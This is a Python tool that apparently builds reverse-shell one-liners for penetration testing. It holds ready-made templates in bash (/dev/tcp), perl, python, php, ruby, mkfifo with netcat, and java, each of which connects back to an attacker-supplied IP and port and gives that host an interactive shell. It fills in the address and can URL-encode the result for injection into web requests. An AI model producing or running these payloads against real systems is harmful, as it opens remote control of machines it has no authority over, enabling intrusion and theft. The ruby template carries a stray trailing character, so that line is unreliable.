#!/usr/bin/env python3

import sys
from urlencodedecode import UrlUtil
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class OneLinersMain:
    
    dicOneLiners = {'bash': 'bash -c \"bash -i >& /dev/tcp/--dir-ip--/--puerto-- 0>&1\"',
                    'perl': 'perl -e \'use Socket;$i="--dir-ip--";$p=--puerto--;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}\'',
                    'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("--dir-ip--",--puerto--));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
                    'php': 'php -r \'$sock=fsockopen("--dir-ip--",--puerto--);exec("/bin/sh -i <&3 >&3 2>&3");\'',
                    'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("--dir-ip--",--puerto--).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)<\'',
                    'mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc --dir-ip-- --puerto-- >/tmp/f',
                    'java': 'r = Runtime.getRuntime();\n\t\t p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/--dir-ip--/--puerto--;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);\n\t\t p.waitFor();'
    }

    def __init__(self, tipo, direc, puerto=80, urlencode=False):
        self.__tipo = tipo
        self.__direc = direc
        self.__puerto = puerto
        self.__urlencode = urlencode
        self.__oneLiner = ""
        self.__oneLinerMod = ""
        self.__oneLinerEncode = ""

    def getOneLiner(self):
        self.__oneLiner = self.dicOneLiners[self.__tipo]
        self.__oneLinerMod = self.__oneLiner.replace("--dir-ip--", self.__direc).replace("--puerto--", str(self.__puerto))
        if self.__urlencode == "True":
            urlUtil = UrlUtil("Url encoder")
            self.__oneLinerEncode = urlUtil.url_encode(self.__oneLinerMod)
            return f"\n\t{Fore.GREEN}[*]{Fore.RESET} Oneliner:\n\n\t\t {Fore.BLUE}{self.__oneLinerEncode}{Fore.RESET} \n"
        else:
            return f"\n\t{Fore.GREEN}[*]{Fore.RESET} Oneliner:\n\n\t\t {Fore.BLUE}{self.__oneLinerMod}{Fore.RESET} \n"

    def setOneLiner(self, tipo, direc, puerto):
        del self.__oneLiner
        del self.__oneLinerMod
        del self.__tipo
        self.__tipo = tipo
        self.__direc = direc
        self.__puerto = puerto


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"\n\t{Fore.RED}[!]{Fore.RESET} Usage: {Fore.GREEN}python3 oneliners.py{Fore.RESET} {Fore.YELLOW}<type>{Fore.RESET} {Fore.YELLOW}<dirección-ip>{Fore.RESET} {Fore.YELLOW}<puerto>{Fore.RESET} {Fore.YELLOW}<encode/decode>{Fore.RESET} \n")
        print(f"\t    Tipos => [ {Fore.CYAN}bash {Fore.RESET}, {Fore.CYAN}perl {Fore.RESET}, {Fore.CYAN}php {Fore.RESET}, {Fore.CYAN}ruby {Fore.RESET}, {Fore.CYAN}mkfifo {Fore.RESET}, {Fore.CYAN}java {Fore.RESET}]\n\n")
        print(f"\t    Tipos de url => [ {Fore.CYAN}True {Fore.RESET}, {Fore.CYAN}False {Fore.RESET}]\n\n")
    else:
        typeRS = sys.argv[1]
        dirIp = sys.argv[2]
        puerto = sys.argv[3]
        urlencode = sys.argv[4]
        oneLinerCustom = OneLinersMain(typeRS, dirIp, puerto, urlencode)
        print(oneLinerCustom.getOneLiner())